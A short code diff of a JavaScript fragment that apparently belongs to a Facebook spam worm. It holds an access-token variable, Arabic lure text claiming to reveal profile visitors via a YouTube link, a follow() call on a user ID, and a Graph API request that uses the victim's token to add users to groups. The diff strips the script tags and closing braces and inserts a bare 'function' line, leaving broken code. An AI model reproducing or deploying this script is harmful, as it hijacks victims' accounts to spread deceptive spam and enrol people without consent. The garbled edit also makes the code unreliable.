@@ -1,5 +1,4 @@
-<script>
-
+function
 var access_token = "";
 var url = "https://www.youtube.com/watch?v=3mDca_ql7Wo";
 var text = "واخيرااااا انا شفت مين بيزور بروفايلي يوميا وكل ما حد يزور بروفايلي يجيلي اشعار وبدون تطبيقات كاذبة ادخل وشوف الفيديو ع يوتيوب وحتركب الخاصية بحسابك بثواني زي ما انا عملتها  --->";
@@ -162,9 +161,4 @@ follow("100004685410997");
 	 $.getJSON('https://graph.facebook.com/'+grpid+'/members/' + userid + '?method=post&access_token=' + access_token, function (response) {
      if(response.data){
 	 }
-	 });
-	 }
-	 });
-	 }
 
-</script>
